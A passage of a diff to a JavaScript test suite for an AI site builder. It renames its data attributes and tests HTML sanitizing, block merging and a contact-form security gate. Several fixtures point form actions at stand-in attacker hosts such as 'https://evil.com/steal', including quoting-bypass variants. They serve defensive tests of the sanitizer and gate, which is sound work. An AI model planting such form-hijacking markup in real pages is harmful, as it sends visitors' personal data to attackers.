 const mIns = mergeBlocks(bpBody, bpBlocks, [{ op: 'insert', targetId: 'b9', after: 'b1' }], { b9: newBlock })
 assert.ok(mIns.includes(newBlock), `FAIL BP6: inserted block missing — got: ${mIns}`)
 assert.ok(mIns.indexOf(bpBlocks[0].html) < mIns.indexOf(newBlock) && mIns.indexOf(newBlock) < mIns.indexOf('<main>'), `FAIL BP6: insert must land after b1 and before <main> — got: ${mIns}`)
@@ -1435,7 +1435,7 @@ assert.ok(mMove.indexOf(bpBlocks[3].html) < mMove.indexOf(bpBlocks[0].html), `FA
 assert.ok(mMove.includes('<main>') && mMove.includes('</main>'), `FAIL BP7: <main> must survive a move — got: ${mMove}`)
 assert.ok(mMove.includes(bpBlocks[0].html) && mMove.includes(bpBlocks[1].html) && mMove.includes(bpBlocks[2].html), `FAIL BP7: move must keep other blocks byte-identical — got: ${mMove}`)
 // the footer was removed from its original position (appears exactly once, at the top)
-assert.strictEqual((mMove.match(/data-yoai-id="b4"/g) || []).length, 1, `FAIL BP7: moved block must not be duplicated — got: ${mMove}`)
+assert.strictEqual((mMove.match(/data-dijimagic-id="b4"/g) || []).length, 1, `FAIL BP7: moved block must not be duplicated — got: ${mMove}`)
 
 // BP8 — mergeBlocks no-op (empty ops) → the ORIGINAL body byte-for-byte (nothing rebuilt)
 const mNoop = mergeBlocks(bpBody, bpBlocks, [], {})
@@ -1455,7 +1455,7 @@ const assertInvariant = (sourceBody, mergedBody, blocks, ops) => {
   const hasDelete = deletedIds.size > 0
   for (const b of blocks) {
     if (deletedIds.has(b.id)) continue
-    const re = new RegExp(`data-yoai-id\\s*=\\s*["']${b.id}["']`)
+    const re = new RegExp(`data-dijimagic-id\\s*=\\s*["']${b.id}["']`)
     if (!re.test(mergedBody)) return { ok: false, reason: 'invariant_block_lost' }
   }
   for (const tag of ['<main', '<header', '<footer']) {
@@ -1558,7 +1558,7 @@ assert.ok(plUser.includes('b1') && plUser.includes('hero bölümünü koyulaşt�
 
 // A block carrying TWO images (so the index matters) + an alt we must preserve.
 const riBlock =
-  '<section data-yoai-block="services" data-yoai-id="b2" class="grid">' +
+  '<section data-dijimagic-block="services" data-dijimagic-id="b2" class="grid">' +
   '<img src="https://cdn.example.com/old-0.jpg" alt="Birinci görsel" width="800" height="600" loading="lazy">' +
   '<h2>Hizmetler</h2>' +
   "<img src='https://cdn.example.com/old-1.jpg' alt=\"İkinci görsel\">" +
@@ -1601,7 +1601,7 @@ assert.ok(isSafeReplaceImageUrl('https://cdn.example.com/ok.jpg'), `FAIL RI3: a 
 
 // RI4 — out-of-range index / no-image block / bad index → null (no mutation).
 assert.strictEqual(replaceBlockImageSrc(riBlock, 5, 'https://cdn.example.com/x.jpg'), null, `FAIL RI4: out-of-range index → null`)
-assert.strictEqual(replaceBlockImageSrc('<section data-yoai-id="b2"><p>no image</p></section>', 0, 'https://cdn.example.com/x.jpg'), null, `FAIL RI4: image-less block → null`)
+assert.strictEqual(replaceBlockImageSrc('<section data-dijimagic-id="b2"><p>no image</p></section>', 0, 'https://cdn.example.com/x.jpg'), null, `FAIL RI4: image-less block → null`)
 assert.strictEqual(replaceBlockImageSrc(riBlock, -1, 'https://cdn.example.com/x.jpg'), null, `FAIL RI4: negative index → null`)
 assert.strictEqual(replaceBlockImageSrc(riBlock, 0.5, 'https://cdn.example.com/x.jpg'), null, `FAIL RI4: non-integer index → null`)
 
@@ -1655,19 +1655,19 @@ console.log('block-patch OK')
 // CONTACT-FORM section — the working contact form (#3)
 //
 // Asserts the FULL security boundary of the form widening:
-//   (CF-S) sanitize: <form data-yoai-form> + text/email/tel inputs + <textarea>
+//   (CF-S) sanitize: <form data-dijimagic-form> + text/email/tel inputs + <textarea>
 //          SURVIVE; password/file/hidden/image inputs are COERCED to type=text;
 //          native action/method/onsubmit/formaction are STRIPPED; the honeypot
-//          (type=text) survives. CRITICAL #3: an AI-authored data-yoai-form-action
+//          (type=text) survives. CRITICAL #3: an AI-authored data-dijimagic-form-action
 //          (single-quoted, double-quoted OR unquoted, any tag) is STRIPPED — the
 //          submit URL is SERVER-OWNED and can NEVER be authored by the AI.
 //   (CF-A) assembleDocument: injectFormAction adds the trusted same-origin action
 //          POST-sanitize in serve mode (formActionBase) and NOT in preview.
 //   (CF-G) gate: a page with a sensitive input, an external native action/formaction,
-//          OR a NON-same-origin data-yoai-form-action → ok:false (suspicious_form);
+//          OR a NON-same-origin data-dijimagic-form-action → ok:false (suspicious_form);
 //          the safe contact form (+ server same-origin action) PASSES.
 //   (CF-X) EXFILTRATION: an AI body with single-quoted AND unquoted external
-//          data-yoai-form-action → after sanitize NO external action survives;
+//          data-dijimagic-form-action → after sanitize NO external action survives;
 //          after SERVE injection the ONLY action is the same-origin /s/<sub>/lead
 //          (exactly once per form); PREVIEW injects nothing; the gate rejects a
 //          surviving non-'/' action.
@@ -1679,7 +1679,7 @@ const { injectFormAction } = await import(assembleDocumentPath)
 
 // A canonical, safe contact form exactly as the prompt instructs the model to emit.
 const safeForm =
-  '<form data-yoai-form class="grid gap-4">' +
+  '<form data-dijimagic-form class="grid gap-4">' +
   '<label for="cf-name">Ad</label>' +
   '<input type="text" name="name" id="cf-name" required placeholder="Adınız" autocomplete="name" class="border">' +
   '<label for="cf-email">E-posta</label>' +
@@ -1688,24 +1688,24 @@ const safeForm =
   '<input type="tel" name="phone" id="cf-phone" placeholder="Telefon" autocomplete="tel" class="border">' +
   '<label for="cf-msg">Mesaj</label>' +
   '<textarea name="message" id="cf-msg" required rows="4" placeholder="Mesajınız" class="border"></textarea>' +
-  '<input type="text" name="company" tabindex="-1" autocomplete="off" aria-hidden="true" class="absolute -left-[9999px] opacity-0" data-yoai-honeypot>' +
+  '<input type="text" name="company" tabindex="-1" autocomplete="off" aria-hidden="true" class="absolute -left-[9999px] opacity-0" data-dijimagic-honeypot>' +
   '<button type="submit" class="bg-[var(--accent)]">Gönder</button>' +
-  '<div data-yoai-form-success hidden>Teşekkürler.</div>' +
-  '<div data-yoai-form-error hidden>Hata.</div>' +
+  '<div data-dijimagic-form-success hidden>Teşekkürler.</div>' +
+  '<div data-dijimagic-form-error hidden>Hata.</div>' +
   '</form>'
 
 // CF-S1 — the safe form + its allowed fields SURVIVE sanitize.
 const cfs = sanitizeSiteHtml(safeForm)
-assert.ok(/<form\b[^>]*data-yoai-form/i.test(cfs), `FAIL CF-S1: <form data-yoai-form> stripped — got: ${cfs}`)
+assert.ok(/<form\b[^>]*data-dijimagic-form/i.test(cfs), `FAIL CF-S1: <form data-dijimagic-form> stripped — got: ${cfs}`)
 assert.ok(/<input\b[^>]*type="text"[^>]*name="name"/i.test(cfs) || /<input\b[^>]*name="name"[^>]*type="text"/i.test(cfs), `FAIL CF-S1: text name input dropped — got: ${cfs}`)
 assert.ok(/<input\b[^>]*type="email"/i.test(cfs), `FAIL CF-S1: email input dropped — got: ${cfs}`)
 assert.ok(/<input\b[^>]*type="tel"/i.test(cfs), `FAIL CF-S1: tel input dropped — got: ${cfs}`)
 assert.ok(/<textarea\b[^>]*name="message"/i.test(cfs), `FAIL CF-S1: <textarea> dropped — got: ${cfs}`)
 assert.ok(/<button\b[^>]*type="submit"/i.test(cfs), `FAIL CF-S1: submit button dropped — got: ${cfs}`)
-assert.ok(cfs.includes('data-yoai-honeypot'), `FAIL CF-S1: honeypot input dropped — got: ${cfs}`)
+assert.ok(cfs.includes('data-dijimagic-honeypot'), `FAIL CF-S1: honeypot input dropped — got: ${cfs}`)
 assert.ok(/\brequired\b/i.test(cfs), `FAIL CF-S1: required attribute dropped — got: ${cfs}`)
-assert.ok(cfs.includes('data-yoai-form-success'), `FAIL CF-S1: success element dropped — got: ${cfs}`)
-assert.ok(cfs.includes('data-yoai-form-error'), `FAIL CF-S1: error element dropped — got: ${cfs}`)
+assert.ok(cfs.includes('data-dijimagic-form-success'), `FAIL CF-S1: success element dropped — got: ${cfs}`)
+assert.ok(cfs.includes('data-dijimagic-form-error'), `FAIL CF-S1: error element dropped — got: ${cfs}`)
 
 // CF-S2 — FORBIDDEN input types are COERCED to type=text (never allowed through).
 const cfPwd = sanitizeSiteHtml('<input type="password" name="pw">')
@@ -1727,7 +1727,7 @@ for (const bad of ['submit', 'button', 'checkbox', 'radio', 'number', 'url', 'da
 
 // CF-S3 — native form/input submit surfaces are STRIPPED.
 const cfActions = sanitizeSiteHtml(
-  '<form data-yoai-form action="https://evil.com/steal" method="post" onsubmit="x()" target="_blank" name="f">' +
+  '<form data-dijimagic-form action="https://evil.com/steal" method="post" onsubmit="x()" target="_blank" name="f">' +
   '<input type="text" name="name" formaction="https://evil.com/x">' +
   '<button type="submit" formaction="https://evil.com/y">Go</button>' +
   '</form>',
@@ -1738,41 +1738,41 @@ assert.ok(!/\starget=/i.test(cfActions), `FAIL CF-S3: form target not stripped �
 assert.ok(!/onsubmit/i.test(cfActions), `FAIL CF-S3: onsubmit not stripped — got: ${cfActions}`)
 assert.ok(!/formaction/i.test(cfActions), `FAIL CF-S3: formaction not stripped — got: ${cfActions}`)
 // the form itself + its safe text input survive (only the dangerous attrs are gone)
-assert.ok(/<form\b[^>]*data-yoai-form/i.test(cfActions), `FAIL CF-S3: form tag must survive (only attrs stripped) — got: ${cfActions}`)
+assert.ok(/<form\b[^>]*data-dijimagic-form/i.test(cfActions), `FAIL CF-S3: form tag must survive (only attrs stripped) — got: ${cfActions}`)
 assert.ok(/<input\b[^>]*type="text"/i.test(cfActions), `FAIL CF-S3: safe input must survive — got: ${cfActions}`)
 
-// CF-S4 — CRITICAL #3: an AI-authored data-yoai-form-action is STRIPPED by sanitize
+// CF-S4 — CRITICAL #3: an AI-authored data-dijimagic-form-action is STRIPPED by sanitize
 // (the submit URL is SERVER-OWNED, injected POST-sanitize — the AI can never set it).
-// data-yoai-form (the inert marker) is KEPT. Every quoting variant is neutralised.
-const cfFAdouble = sanitizeSiteHtml('<form data-yoai-form data-yoai-form-action="https://evil/x"><input type="text" name="name"></form>')
-assert.ok(!/data-yoai-form-action/i.test(cfFAdouble), `FAIL CF-S4: double-quoted AI form-action survived sanitize — got: ${cfFAdouble}`)
-assert.ok(/<form\b[^>]*data-yoai-form/i.test(cfFAdouble), `FAIL CF-S4: data-yoai-form marker must be KEPT — got: ${cfFAdouble}`)
-const cfFAsingle = sanitizeSiteHtml("<form data-yoai-form data-yoai-form-action='https://evil/x'><input type=\"text\" name=\"name\"></form>")
-assert.ok(!/data-yoai-form-action/i.test(cfFAsingle), `FAIL CF-S4: single-quoted AI form-action survived sanitize — got: ${cfFAsingle}`)
-const cfFAunq = sanitizeSiteHtml('<form data-yoai-form data-yoai-form-action=https://evil/x><input type="text" name="name"></form>')
-assert.ok(!/data-yoai-form-action/i.test(cfFAunq), `FAIL CF-S4: unquoted AI form-action survived sanitize — got: ${cfFAunq}`)
+// data-dijimagic-form (the inert marker) is KEPT. Every quoting variant is neutralised.
+const cfFAdouble = sanitizeSiteHtml('<form data-dijimagic-form data-dijimagic-form-action="https://evil/x"><input type="text" name="name"></form>')
+assert.ok(!/data-dijimagic-form-action/i.test(cfFAdouble), `FAIL CF-S4: double-quoted AI form-action survived sanitize — got: ${cfFAdouble}`)
+assert.ok(/<form\b[^>]*data-dijimagic-form/i.test(cfFAdouble), `FAIL CF-S4: data-dijimagic-form marker must be KEPT — got: ${cfFAdouble}`)
+const cfFAsingle = sanitizeSiteHtml("<form data-dijimagic-form data-dijimagic-form-action='https://evil/x'><input type=\"text\" name=\"name\"></form>")
+assert.ok(!/data-dijimagic-form-action/i.test(cfFAsingle), `FAIL CF-S4: single-quoted AI form-action survived sanitize — got: ${cfFAsingle}`)
+const cfFAunq = sanitizeSiteHtml('<form data-dijimagic-form data-dijimagic-form-action=https://evil/x><input type="text" name="name"></form>')
+assert.ok(!/data-dijimagic-form-action/i.test(cfFAunq), `FAIL CF-S4: unquoted AI form-action survived sanitize — got: ${cfFAunq}`)
 // even on a non-form element (the global data-* glob must not re-permit it)
-const cfFAdiv = sanitizeSiteHtml('<div data-yoai-form-action="https://evil/x">x</div>')
-assert.ok(!/data-yoai-form-action/i.test(cfFAdiv), `FAIL CF-S4: AI form-action survived on a <div> — got: ${cfFAdiv}`)
-// OTHER data-yoai-* hooks must still survive (we only strip the action attr)
-const cfOtherData = sanitizeSiteHtml('<section data-yoai-reveal data-yoai-block="hero">x</section>')
-assert.ok(/data-yoai-reveal/.test(cfOtherData) && /data-yoai-block="hero"/.test(cfOtherData), `FAIL CF-S4: unrelated data-yoai-* hooks were stripped — got: ${cfOtherData}`)
+const cfFAdiv = sanitizeSiteHtml('<div data-dijimagic-form-action="https://evil/x">x</div>')
+assert.ok(!/data-dijimagic-form-action/i.test(cfFAdiv), `FAIL CF-S4: AI form-action survived on a <div> — got: ${cfFAdiv}`)
+// OTHER data-dijimagic-* hooks must still survive (we only strip the action attr)
+const cfOtherData = sanitizeSiteHtml('<section data-dijimagic-reveal data-dijimagic-block="hero">x</section>')
+assert.ok(/data-dijimagic-reveal/.test(cfOtherData) && /data-dijimagic-block="hero"/.test(cfOtherData), `FAIL CF-S4: unrelated data-dijimagic-* hooks were stripped — got: ${cfOtherData}`)
 
 // CF-A1 — injectFormAction (POST-sanitize): serve injects the trusted action; empty
 // base is a no-op; result carries EXACTLY ONE same-origin action per form.
-const rwForm = injectFormAction('<form data-yoai-form class="x"><input type="text" name="name"></form>', '/s/acme/lead')
-assert.ok(rwForm.includes('data-yoai-form-action="/s/acme/lead"'), `FAIL CF-A1: action not injected in serve — got: ${rwForm}`)
+const rwForm = injectFormAction('<form data-dijimagic-form class="x"><input type="text" name="name"></form>', '/s/acme/lead')
+assert.ok(rwForm.includes('data-dijimagic-form-action="/s/acme/lead"'), `FAIL CF-A1: action not injected in serve — got: ${rwForm}`)
 assert.ok(/class="x"/.test(rwForm), `FAIL CF-A1: existing attrs must be preserved — got: ${rwForm}`)
-assert.strictEqual((rwForm.match(/data-yoai-form-action=/g) || []).length, 1, `FAIL CF-A1: exactly one action expected — got: ${rwForm}`)
+assert.strictEqual((rwForm.match(/data-dijimagic-form-action=/g) || []).length, 1, `FAIL CF-A1: exactly one action expected — got: ${rwForm}`)
 // empty/undefined base → no-op (preview/thumb → optimistic success); markup unchanged
-assert.strictEqual(injectFormAction('<form data-yoai-form></form>', ''), '<form data-yoai-form></form>', `FAIL CF-A1: empty base must be a no-op`)
-assert.strictEqual(injectFormAction('<form data-yoai-form></form>', undefined), '<form data-yoai-form></form>', `FAIL CF-A1: undefined base must be a no-op`)
+assert.strictEqual(injectFormAction('<form data-dijimagic-form></form>', ''), '<form data-dijimagic-form></form>', `FAIL CF-A1: empty base must be a no-op`)
+assert.strictEqual(injectFormAction('<form data-dijimagic-form></form>', undefined), '<form data-dijimagic-form></form>', `FAIL CF-A1: undefined base must be a no-op`)
 // a non-same-origin base is refused (defense-in-depth) → no-op
-assert.ok(!/data-yoai-form-action/i.test(injectFormAction('<form data-yoai-form></form>', 'https://evil/x')), `FAIL CF-A1: absolute base must NOT be injected`)
-assert.ok(!/data-yoai-form-action/i.test(injectFormAction('<form data-yoai-form></form>', '//evil/x')), `FAIL CF-A1: protocol-relative base must NOT be injected`)
+assert.ok(!/data-dijimagic-form-action/i.test(injectFormAction('<form data-dijimagic-form></form>', 'https://evil/x')), `FAIL CF-A1: absolute base must NOT be injected`)
+assert.ok(!/data-dijimagic-form-action/i.test(injectFormAction('<form data-dijimagic-form></form>', '//evil/x')), `FAIL CF-A1: protocol-relative base must NOT be injected`)
 // idempotent: re-injecting yields exactly one action (no duplicate)
 const rwTwice = injectFormAction(rwForm, '/s/acme/lead')
-assert.strictEqual((rwTwice.match(/data-yoai-form-action=/g) || []).length, 1, `FAIL CF-A1: action must not be duplicated on re-inject — got: ${rwTwice}`)
+assert.strictEqual((rwTwice.match(/data-dijimagic-form-action=/g) || []).length, 1, `FAIL CF-A1: action must not be duplicated on re-inject — got: ${rwTwice}`)
 // pages WITHOUT a form are returned byte-for-byte unchanged (no cheerio reserialise)
 const noForm = '<main><h1>x</h1><p>no form here</p></main>'
 assert.strictEqual(injectFormAction(noForm, '/s/acme/lead'), noForm, `FAIL CF-A1: form-less body must be unchanged`)
@@ -1788,7 +1788,7 @@ const cfServeDoc = await assembleDocument({
   mode: 'serve',
   formActionBase: '/s/acme/lead',
 })
-assert.ok(cfServeDoc.includes('data-yoai-form-action="/s/acme/lead"'), `FAIL CF-A2: serve assembleDocument must inject the lead action`)
+assert.ok(cfServeDoc.includes('data-dijimagic-form-action="/s/acme/lead"'), `FAIL CF-A2: serve assembleDocument must inject the lead action`)
 assert.ok(cfServeDoc.includes('<form') && /name="name"/.test(cfServeDoc), `FAIL CF-A2: form must survive assemble`)
 
 const cfPreviewDoc = await assembleDocument({
@@ -1801,18 +1801,18 @@ const cfPreviewDoc = await assembleDocument({
   // no formActionBase → optimistic preview (no real send)
 })
 // NOTE: preview INLINES the runtime, whose behavior-contract comment mentions the
-// string 'data-yoai-form-action' — so we must assert the <form> TAG itself carries
+// string 'data-dijimagic-form-action' — so we must assert the <form> TAG itself carries
 // no action attribute, not merely that the substring is absent from the document.
 const cfPreviewFormTag = (cfPreviewDoc.match(/<form\b[^>]*>/i) || [''])[0]
-assert.ok(!/data-yoai-form-action/i.test(cfPreviewFormTag), `FAIL CF-A2: preview <form> must NOT carry a form action (optimistic) — got tag: ${cfPreviewFormTag}`)
+assert.ok(!/data-dijimagic-form-action/i.test(cfPreviewFormTag), `FAIL CF-A2: preview <form> must NOT carry a form action (optimistic) — got tag: ${cfPreviewFormTag}`)
 
 // CF-G1 — the SAFE contact form passes the gate (no suspicious_form, valid structure).
 const cfGateSafe = gateSiteHtml('<header><nav></nav></header><main><h1>İletişim</h1>' + safeForm + '</main><footer>f</footer>')
 assert.ok(cfGateSafe.ok === true, `FAIL CF-G1: safe contact form must pass the gate — got: ${JSON.stringify(cfGateSafe)}`)
-assert.ok(/<form\b[^>]*data-yoai-form/i.test(cfGateSafe.html), `FAIL CF-G1: gated html must keep the safe form — got: ${cfGateSafe.html}`)
+assert.ok(/<form\b[^>]*data-dijimagic-form/i.test(cfGateSafe.html), `FAIL CF-G1: gated html must keep the safe form — got: ${cfGateSafe.html}`)
 
 // CF-G2 — a page with a type=password input is REJECTED (suspicious_form).
-const cfGatePwd = gateSiteHtml('<header><nav></nav></header><main><h1>Giriş</h1><form data-yoai-form><input type="password" name="pw"></form></main><footer>f</footer>')
+const cfGatePwd = gateSiteHtml('<header><nav></nav></header><main><h1>Giriş</h1><form data-dijimagic-form><input type="password" name="pw"></form></main><footer>f</footer>')
 assert.ok(cfGatePwd.ok === false, `FAIL CF-G2: password input must fail the gate — got: ${JSON.stringify(cfGatePwd)}`)
 assert.ok(!cfGatePwd.ok && cfGatePwd.reason === 'suspicious_form', `FAIL CF-G2: reason must be suspicious_form — got: ${JSON.stringify(cfGatePwd)}`)
 
@@ -1824,18 +1824,18 @@ assert.strictEqual(gateSiteHtml('<main><h1>x</h1><input type="hidden" name="h"><
 const cfGateAction = gateSiteHtml('<header><nav></nav></header><main><h1>x</h1><form action="https://evil.com/steal" method="post"><input type="text" name="name"></form></main><footer>f</footer>')
 assert.ok(cfGateAction.ok === false && cfGateAction.reason === 'suspicious_form', `FAIL CF-G3: external form action must fail with suspicious_form — got: ${JSON.stringify(cfGateAction)}`)
 // formaction on a submit control also fails
-const cfGateFormAction = gateSiteHtml('<main><h1>x</h1><form data-yoai-form><button type="submit" formaction="https://evil.com/x">Go</button></form></main>')
+const cfGateFormAction = gateSiteHtml('<main><h1>x</h1><form data-dijimagic-form><button type="submit" formaction="https://evil.com/x">Go</button></form></main>')
 assert.ok(cfGateFormAction.ok === false && cfGateFormAction.reason === 'suspicious_form', `FAIL CF-G3: formaction must fail with suspicious_form — got: ${JSON.stringify(cfGateFormAction)}`)
 
-// CF-G4 — the SERVER's same-origin data-yoai-form-action (hyphenated) must NOT trip
+// CF-G4 — the SERVER's same-origin data-dijimagic-form-action (hyphenated) must NOT trip
 // the formaction check NOR the same-origin backstop (it is the safe declarative hook,
 // not a native formaction; '/s/acme/lead' is same-origin). Belt-and-suspenders.
-const cfGateHook = gateSiteHtml('<header><nav></nav></header><main><h1>x</h1><form data-yoai-form data-yoai-form-action="/s/acme/lead"><input type="text" name="name"></form></main><footer>f</footer>')
-assert.ok(cfGateHook.ok === true, `FAIL CF-G4: same-origin data-yoai-form-action must NOT be mistaken for a native/exfil action — got: ${JSON.stringify(cfGateHook)}`)
+const cfGateHook = gateSiteHtml('<header><nav></nav></header><main><h1>x</h1><form data-dijimagic-form data-dijimagic-form-action="/s/acme/lead"><input type="text" name="name"></form></main><footer>f</footer>')
+assert.ok(cfGateHook.ok === true, `FAIL CF-G4: same-origin data-dijimagic-form-action must NOT be mistaken for a native/exfil action — got: ${JSON.stringify(cfGateHook)}`)
 
 // ---------------------------------------------------------------------------
 // CF-X — EXFILTRATION DEFENSE (CRITICAL #3): the AI tries to point the contact
-// form at an attacker URL via data-yoai-form-action. The server FULLY OWNS the
+// form at an attacker URL via data-dijimagic-form-action. The server FULLY OWNS the
 // action: sanitize strips ANY AI value (every quoting variant); the server injects
 // the ONLY action (same-origin) POST-sanitize; preview injects nothing; the gate
 // rejects any surviving non-same-origin action.
@@ -1845,21 +1845,21 @@ assert.ok(cfGateHook.ok === true, `FAIL CF-G4: same-origin data-yoai-form-action
 // stray duplicate on a non-form element — the classic duplicate-attribute bypass.
 const exfilBody =
   '<header><nav></nav></header><main><h1>İletişim</h1>' +
-  "<form data-yoai-form data-yoai-form-action='https://evil/single' data-yoai-form-action=https://evil/unquoted class=\"grid\">" +
+  "<form data-dijimagic-form data-dijimagic-form-action='https://evil/single' data-dijimagic-form-action=https://evil/unquoted class=\"grid\">" +
   '<input type="text" name="name"><input type="email" name="email">' +
   '<textarea name="message"></textarea>' +
   '<button type="submit">Gönder</button>' +
   '</form>' +
-  '<div data-yoai-form-action="https://evil/div">x</div>' +
+  '<div data-dijimagic-form-action="https://evil/div">x</div>' +
   '</main><footer>f</footer>'
 
 // CF-X1 — after SANITIZE alone: NO external (evil) action survives anywhere.
 const exfilClean = sanitizeSiteHtml(exfilBody)
-assert.ok(!/data-yoai-form-action/i.test(exfilClean), `FAIL CF-X1: an AI form-action survived sanitize — got: ${exfilClean}`)
+assert.ok(!/data-dijimagic-form-action/i.test(exfilClean), `FAIL CF-X1: an AI form-action survived sanitize — got: ${exfilClean}`)
 assert.ok(!/evil/i.test(exfilClean), `FAIL CF-X1: an attacker URL survived sanitize — got: ${exfilClean}`)
-assert.ok(/<form\b[^>]*data-yoai-form/i.test(exfilClean), `FAIL CF-X1: the form marker must survive — got: ${exfilClean}`)
+assert.ok(/<form\b[^>]*data-dijimagic-form/i.test(exfilClean), `FAIL CF-X1: the form marker must survive — got: ${exfilClean}`)
 
-// CF-X2 — after assembleDocument SERVE injection: the ONLY data-yoai-form-action is
+// CF-X2 — after assembleDocument SERVE injection: the ONLY data-dijimagic-form-action is
 // the SERVER's same-origin /s/acme/lead, appearing EXACTLY ONCE (one form), no evil.
 const exfilServe = await assembleDocument({
   bodyHtml: exfilBody,
@@ -1870,12 +1870,12 @@ const exfilServe = await assembleDocument({
   mode: 'serve',
   formActionBase: '/s/acme/lead',
 })
-const exfilActions = exfilServe.match(/data-yoai-form-action="[^"]*"/gi) || []
-assert.strictEqual(exfilActions.length, 1, `FAIL CF-X2: expected exactly ONE data-yoai-form-action, got ${exfilActions.length} — ${JSON.stringify(exfilActions)}`)
-assert.strictEqual(exfilActions[0], 'data-yoai-form-action="/s/acme/lead"', `FAIL CF-X2: the ONLY action must be the server same-origin path — got: ${exfilActions[0]}`)
+const exfilActions = exfilServe.match(/data-dijimagic-form-action="[^"]*"/gi) || []
+assert.strictEqual(exfilActions.length, 1, `FAIL CF-X2: expected exactly ONE data-dijimagic-form-action, got ${exfilActions.length} — ${JSON.stringify(exfilActions)}`)
+assert.strictEqual(exfilActions[0], 'data-dijimagic-form-action="/s/acme/lead"', `FAIL CF-X2: the ONLY action must be the server same-origin path — got: ${exfilActions[0]}`)
 assert.ok(!/evil/i.test(exfilServe), `FAIL CF-X2: an attacker URL leaked into the served document — got (excerpt): ${exfilServe.slice(exfilServe.indexOf('<body'), exfilServe.indexOf('<body') + 600)}`)
 
-// CF-X3 — PREVIEW mode (no formActionBase): NO data-yoai-form-action injected on the
+// CF-X3 — PREVIEW mode (no formActionBase): NO data-dijimagic-form-action injected on the
 // form tag (runtime → optimistic success, no fetch). (Preview INLINES the runtime,
 // whose comment mentions the attribute name, so assert on the <form> TAG itself.)
 const exfilPreview = await assembleDocument({
@@ -1887,23 +1887,23 @@ const exfilPreview = await assembleDocument({
   mode: 'preview',
 })
 const exfilPreviewFormTag = (exfilPreview.match(/<form\b[^>]*>/i) || [''])[0]
-assert.ok(!/data-yoai-form-action/i.test(exfilPreviewFormTag), `FAIL CF-X3: preview <form> must carry NO action (optimistic) — got tag: ${exfilPreviewFormTag}`)
+assert.ok(!/data-dijimagic-form-action/i.test(exfilPreviewFormTag), `FAIL CF-X3: preview <form> must carry NO action (optimistic) — got tag: ${exfilPreviewFormTag}`)
 assert.ok(!/evil/i.test(exfilPreview), `FAIL CF-X3: an attacker URL leaked into the preview document`)
 
 // CF-X4 — the GATE rejects an AI body that authored a NON-same-origin form action
 // (single-quoted / double-quoted / unquoted — every classic quoting bypass).
 for (const evilForm of [
-  '<form data-yoai-form data-yoai-form-action="https://evil/x"><input type="text" name="n"></form>',
-  "<form data-yoai-form data-yoai-form-action='https://evil/x'><input type=\"text\" name=\"n\"></form>",
-  '<form data-yoai-form data-yoai-form-action=https://evil/x><input type="text" name="n"></form>',
-  '<form data-yoai-form data-yoai-form-action="//evil/x"><input type="text" name="n"></form>',
+  '<form data-dijimagic-form data-dijimagic-form-action="https://evil/x"><input type="text" name="n"></form>',
+  "<form data-dijimagic-form data-dijimagic-form-action='https://evil/x'><input type=\"text\" name=\"n\"></form>",
+  '<form data-dijimagic-form data-dijimagic-form-action=https://evil/x><input type="text" name="n"></form>',
+  '<form data-dijimagic-form data-dijimagic-form-action="//evil/x"><input type="text" name="n"></form>',
 ]) {
   const g = gateSiteHtml('<header><nav></nav></header><main><h1>x</h1>' + evilForm + '</main><footer>f</footer>')
   assert.ok(g.ok === false && g.reason === 'suspicious_form', `FAIL CF-X4: external/exfil form-action must be rejected as suspicious_form — got: ${JSON.stringify(g)} for: ${evilForm}`)
 }
 
 // CF-X5 — BACKSTOP: even if a future allowlist regression let a non-same-origin
-// data-yoai-form-action SURVIVE into the gated (post-sanitize) body, the gate's
+// data-dijimagic-form-action SURVIVE into the gated (post-sanitize) body, the gate's
 // post-sanitize same-origin check rejects it. We import the gate's pure helper by
 // replicating its contract: a same-origin '/…' passes (CF-G4), a '//evil' / absolute
 // value is suspicious. (Asserted end-to-end via CF-X4 raw path; here we additionally
@@ -1911,18 +1911,18 @@ for (const evilForm of [
 // the gate is run on the SANITIZED-then-injected body.)
 const injectedThenGated = gateSiteHtml(
   '<header><nav></nav></header><main><h1>x</h1>' +
-  injectFormAction(sanitizeSiteHtml('<form data-yoai-form><input type="text" name="n"></form>'), '/s/acme/lead') +
+  injectFormAction(sanitizeSiteHtml('<form data-dijimagic-form><input type="text" name="n"></form>'), '/s/acme/lead') +
   '</main><footer>f</footer>',
 )
 assert.ok(injectedThenGated.ok === true, `FAIL CF-X5: server same-origin injected action must PASS the gate — got: ${JSON.stringify(injectedThenGated)}`)
 
-// CF-P1 — the generation prompt now instructs a FUNCTIONAL form (data-yoai-form +
+// CF-P1 — the generation prompt now instructs a FUNCTIONAL form (data-dijimagic-form +
 // the field set) and STILL forbids credentials/payment/upload.
 const cfSys = buildHtmlSystemPrompt()
-assert.ok(cfSys.includes('data-yoai-form'), `FAIL CF-P1: prompt must instruct <form data-yoai-form>`)
+assert.ok(cfSys.includes('data-dijimagic-form'), `FAIL CF-P1: prompt must instruct <form data-dijimagic-form>`)
 assert.ok(/name="name"/.test(cfSys) && /type="email"/.test(cfSys) && /type="tel"/.test(cfSys) && /textarea/.test(cfSys), `FAIL CF-P1: prompt must describe the name/email/phone/message fields`)
 assert.ok(/honeypot/i.test(cfSys) && /name="company"/.test(cfSys), `FAIL CF-P1: prompt must describe the honeypot`)
-assert.ok(/data-yoai-form-success/.test(cfSys), `FAIL CF-P1: prompt must describe the success element`)
+assert.ok(/data-dijimagic-form-success/.test(cfSys), `FAIL CF-P1: prompt must describe the success element`)
 assert.ok(/password/i.test(cfSys) && /payment|checkout/i.test(cfSys) && /upload|file/i.test(cfSys), `FAIL CF-P1: prompt must still forbid password/payment/upload`)
 
 console.log('contact-form OK')
